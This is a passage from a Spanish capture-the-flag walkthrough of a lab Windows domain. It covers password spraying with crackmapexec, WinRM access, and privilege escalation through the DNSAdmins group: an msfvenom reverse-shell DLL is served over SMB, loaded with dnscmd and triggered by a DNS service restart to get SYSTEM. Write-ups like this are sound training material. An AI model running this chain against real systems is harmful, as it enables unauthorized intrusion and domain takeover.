*Evil-WinRM* PS C:\> cd Temp
*Evil-WinRM* PS C:\Temp> upload winPEASx64.exe
                                        
Info: Uploading /home/berserkwings/Escritorio/TheHackersLabs/Doraemon/content/winPEASx64.exe to C:\Temp\winPEASx64.exe
                                        
Data: 13521576 bytes of 13521576 bytes copied
                                        
Info: Upload successful!
```

Ejecútalo:
```batch
*Evil-WinRM* PS C:\Temp> ./winPEASx64.exe
 [!] If you want to run the file analysis checks (search sensitive information in files), you need to specify the 'fileanalysis' or 'all' argument. Note that this search might take several minutes. For help, run winpeass.exe --help
ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
....
....
....
```

Revisando casi al final, podemos ver que se encontró un archivo oculto:
```batch
ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching hidden files or folders in C:\Users home (can be slow)

     C:\Users\Default User
     C:\Users\Default
     C:\Users\All Users
     C:\Users\Default
     C:\Users\Doraemon\Links\Carta de amor a Shizuka.txt
     C:\Users\All Users
     C:\Users\All Users\ntuser.pol
```

Vamos a leerlo:
```batch
*Evil-WinRM* PS C:\Temp> type "C:\Users\Doraemon\Links\Carta de amor a Shizuka.txt"
Shizuka te doy la clave de mi corazon: ********
```
Parece que tenemos la contraseña de alguien.

Podemos probar a quién pertenece aplicando **Password Spraying**:
```bash
crackmapexec smb 192.168.10.5 -u AD_users.txt -p '***********' --continue-on-success --no-brute
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL) (signing:True) (SMBv1:True)
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\administrador:*********** STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\guest:*********** 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\invitado:*********** STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Nobita:*********** STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Shizuka:*********** STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\Suneo:*********** 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Gigante:*********** STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Doraemon:*********** STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\Dorayaki1:*********** 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\Estepona:***********
```
La contraseña pertenece al **usuario Suneo**.

Probemos si sirve para el **servicio WinRM**:
```bash
crackmapexec winrm 192.168.10.5 -u 'Suneo' -p '***********'
SMB         192.168.10.5    5985   WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL)
HTTP        192.168.10.5    5985   WIN-VRU3GG3DPLJ  [*] http://192.168.10.5:5985/wsman
WINRM       192.168.10.5    5985   WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\Suneo:*********** (Pwn3d!)
```
Genial.

Vamos a loguearnos como el **usuario Suneo** al **servicio WinRM**:
```batch
evil-winrm -i 192.168.10.5 -u 'Suneo' -p '*********'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Suneo\Documents> whoami
doraemon\suneo
```
Estamos dentro.

Aquí si encontraremos la flag del usuario:
```batch
*Evil-WinRM* PS C:\Users\Suneo\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Suneo\Desktop> type user.txt
...
```

## Post Explotación {#Post}

### Abusando de Grupo DNSAdmins para Cargar Reverse Shell en un Archivo DLL y Escalar Privilegios {#dnsGroup}

Revisemos que privilegios tiene este usuario:
```batch
*Evil-WinRM* PS C:\Users\Suneo\Desktop> whoami /priv

INFORMACIàN DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci¢n                                  Estado
============================= ============================================ ==========
SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio     Habilitada
SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido             Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Habilitada
```
Los mismos que los del usuario anterior.

Veamos a que grupos pertenece:
```batch
*Evil-WinRM* PS C:\Users\Suneo\Desktop> whoami /groups

INFORMACIàN DE GRUPO
--------------------

Nombre de grupo                                                    Tipo           SID                                           Atributos
================================================================== ============== ============================================= =====================================================================================
Todos                                                              Grupo conocido S-1-1-0                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Usuarios de administraci¢n remota                          Alias          S-1-5-32-580                                  Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Usuarios                                                   Alias          S-1-5-32-545                                  Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Acceso compatible con versiones anteriores de Windows 2000 Alias          S-1-5-32-554                                  Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\NETWORK                                               Grupo conocido S-1-5-2                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Usuarios autentificados                               Grupo conocido S-1-5-11                                      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Esta compa¤¡a                                         Grupo conocido S-1-5-15                                      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
DORAEMON\DnsAdmins                                                 Grupo          S-1-5-21-3046175042-3013395696-775018414-1101 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
DORAEMON\Dorayaki                                                  Alias          S-1-5-21-3046175042-3013395696-775018414-1109 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado, Grupo local
NT AUTHORITY\Autenticaci¢n NTLM                                    Grupo conocido S-1-5-64-10                                   Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
Etiqueta obligatoria\Nivel obligatorio medio alto                  Etiqueta       S-1-16-8448
```
Parece que este usuario pertenece al **grupo DNSAdmins**.

Vamos a investigar de que va este grupo:

| **Grupo DNSAdmins** |
|:-----------:|
| *El grupo DNSAdmins en Active Directory es un grupo predeterminado en Windows Server que otorga permisos especiales para gestionar y administrar la infraestructura DNS (Domain Name System) dentro de un entorno de Active Directory. Los miembros del grupo DnsAdmins pueden explotar sus privilegios para cargar una DLL arbitraria con privilegios de SISTEMA en un servidor DNS, a menudo alojado en Controladores de Dominio.* |

Parece que podemos abusar de este grupo para escalar privilegios.

Investigando un poco más, encontré este blog:
* <a href="https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/" target="_blank">Windows Privilege Escalation: DnsAdmins to DomainAdmin</a>

En resumen, nos explica como abusar de este grupo, para cargar un **archivo DLL** que contiene una **Reverse Shell** desde un **servidor SMB** con el **comando dnscmd.exe**. Después, debemos reiniciar el **servicio DNS** para que se inyecte el **archivo DLL** en la memoria y se ejecute nuestra **Reverse Shell**.

¿Esto lo menciona **BloodHound**? Me parece que no, o al menos yo no encontre una mención sobre esta posible escalada de privilegios en la versión actual de **BloodHound**:

<p align="center">
<img src="/assets/images/THL-writeup-doraemon/Captura1.png">
</p>

Nos menciona otra, pero en mi caso, no me funciono:

<p align="center">
<img src="/assets/images/THL-writeup-doraemon/Captura2.png">
</p>

Continuemos.

* Primero vamos a generar nuestra **Reverse Shell** como un **archivo DLL**:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=Tu_IP LPORT=443 -f dll -o revShell.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: revShell.dll
```

* Vamos a levantar un **servidor SMB** en donde tengamos nuestra **Reverse Shell**:
```bash
impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
.
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

* Abrimos una **netcat** utilizando **rlwrap**:
```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
```

* Desde nuestra sesión de **Evil-WinRM**, usaremos el **binario dnscmd.exe** para interactuar directamente con el **archivo DLL** que tenemos en el **servidor SMB** con tal de pasarlo a la memoria como **SYSTEM**, y usando los parámetros **config y serverlevelplugindll**, le damos la ruta de nuestro servidor:
```batch
*Evil-WinRM* PS C:\Users\Suneo\Desktop> dnscmd.exe /config /serverlevelplugindll \\Tu_IP\smbFolder\revShell.dll
Propiedad del Registro serverlevelplugindll restablecida correctamente.
Comando completado correctamente.
```

| Parámetros | Descripción |
|---|---|
| *dnscmd.exe* | Herramienta de línea de comandos para administrar servidores DNS. |
| */config*  | Subcomando que modifica la configuración del servidor. |
| */serverlevelplugindll* | Indica que se quiere establecer una DLL personalizada para ejecutar en el contexto del servicio DNS (dnssvc). |
| *ruta_dll* | La ruta completa hacia el archivo .dll que se quiere cargar como plugin. |

* Por último, reiniciamos el **servicio DNS** usando el **comando sc.exe**:
```batch
*Evil-WinRM* PS C:\Users\Suneo\Desktop> sc.exe stop dns
.
NOMBRE_SERVICIO: dns
        TIPO               : 10  WIN32_OWN_PROCESS
        ESTADO             : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        CàD_SALIDA_WIN32   : 0  (0x0)
        CàD_SALIDA_SERVICIO: 0  (0x0)
        PUNTO_COMPROB.     : 0x1
        INDICACIàN_INICIO  : 0x7530
*Evil-WinRM* PS C:\Users\Suneo\Desktop> sc.exe start dns
.
NOMBRE_SERVICIO: dns
        TIPO               : 10  WIN32_OWN_PROCESS
        ESTADO             : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        CàD_SALIDA_WIN32   : 0  (0x0)
        CàD_SALIDA_SERVICIO: 0  (0x0)
        PUNTO_COMPROB.     : 0x1
        INDICACIàN_INICIO  : 0x4e20
        PID                : 2044
        MARCAS         :
```

* Observa que después de reiniciar el **servicio DNS**, hubo una conexión a nuestro **servidor SMB** que parece está ejecutando el **archivo DLL** que tiene nuestra **Reverse Shell**:
```bash
impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
.
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (192.168.10.5,49702)
[*] AUTHENTICATE_MESSAGE (DORAEMON\WIN-VRU3GG3DPLJ$,WIN-VRU3GG3DPLJ)
[*] User WIN-VRU3GG3DPLJ\WIN-VRU3GG3DPLJ$ authenticated successfully
[*] WIN-VRU3GG3DPLJ$::DORAEMON:aaaaaaaaaaaaaaaa:d75522782ff4a27cc3132124...
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:smbFolder)
[*] Disconnecting Share(1:IPC$)
```

* Y observa la **netcat**:
```batch
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.10.5] 49703
Microsoft Windows [Versi�n 10.0.14393]
(c) 2016 Microsoft Corporation. Todos los derechos reservados.
.
C:\Windows\system32>whoami
whoami
nt authority\system
```
Estamos dentro.

Ya solo tenemos que buscar la última flag:
```batch
C:\Windows\system32>cd C:\Users\Administrador\Desktop
cd C:\Users\Administrador\Desktop
.
C:\Users\Administrador\Desktop>type root.txt
type root.txt
...
```
Y con esto, terminamos la máquina.
